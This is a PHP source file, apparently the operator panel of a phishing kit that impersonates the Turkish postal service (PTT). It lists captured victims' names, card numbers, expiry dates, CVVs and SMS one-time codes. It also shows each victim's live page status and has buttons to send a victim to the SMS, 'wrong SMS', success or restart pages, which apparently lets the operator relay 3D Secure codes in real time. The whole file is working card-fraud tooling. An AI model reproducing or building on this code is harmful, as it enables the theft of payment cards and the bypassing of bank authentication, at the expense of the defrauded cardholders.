<?php
include '../db/connect.php';

// Verileri sorgula
$sorgu = "SELECT * FROM bella_ptt3_logs ORDER BY id DESC";
$sonuclar = $baglanti->query($sorgu);

$tablo = "";
while ($row = $sonuclar->fetch(PDO::FETCH_ASSOC)) {


$durum = $row["durum"];

if($durum == "sms")
{
    $durum = "<span style='color:skyblue;'>✉️ SMS Sayfasında!</span>";
} 

if($durum == "hsms")
{
    $durum = "<span style='color:red;'>✉️ Hatalı SMS Sayfasında!</span>";
}

if($durum == "webonay")
{
    $durum = "<span style='color:yellow;'>⏳ Web Onay Sayfasında!</span>";
}

if($durum == "bekle")
{
    $durum = "<span style='color:white;'>⏳ Bekleme Sayfasında!</span>";
}

if($durum == "tekrar")
{
    $durum = "<span style='color:white;'>🔁 Kullanıcı Tekrarlandı!</span>";
}

if($durum == "tebrik")
{
    $durum = "<span style='color:white;'>🎉 Tebrik Sayfasında!</span>";
}

if($durum == "form")
{
    $durum = "<span style='color:white;'>⏳ Form Dolduruyor!</span>";
}


if($row["tur"] == "3d"){

    $tablo .= '<tr>
        <td>' . $row['isimsoyisim'] .'</td>
        <td>' . $row['kart'] . '</td>
        <td>' . $row['karttarih'] . '</td>
        <td>' . $row['kartcvv'] . '</td>
        <td>' . $row['sms'] . '</td>
        <td>' . $row['hsms'] . '</td>
        <td>' . $durum . '</td>
        <td>' . $row['zaman'] . '</td>
        <td>
        <a href="islem.php?islem=sms&id='.$row["id"].'"><button class="btn btn-primary">SMS</button></a>
        <a href="islem.php?islem=hsms&id='.$row["id"].'"><button class="btn btn-danger">Hatalı SMS</button></a><br>
        <a href="islem.php?islem=tebrik&id='.$row["id"].'"><button class="btn btn-success">Başarılı</button></a>
        <a href="islem.php?islem=tekrar&id='.$row["id"].'"><button class="btn btn-warning">Başa Gönder</button></a>
        <a href="islem.php?islem=sil&tur=arac&id='.$row["id"].'"><button class="btn btn-danger">Sil</button>
        </td>
    </tr>';
}}

// Tabloyu JSON yerine HTML olarak döndür
echo $tablo;

// Veritabanı bağlantısını kapat
$baglanti = null;
?>
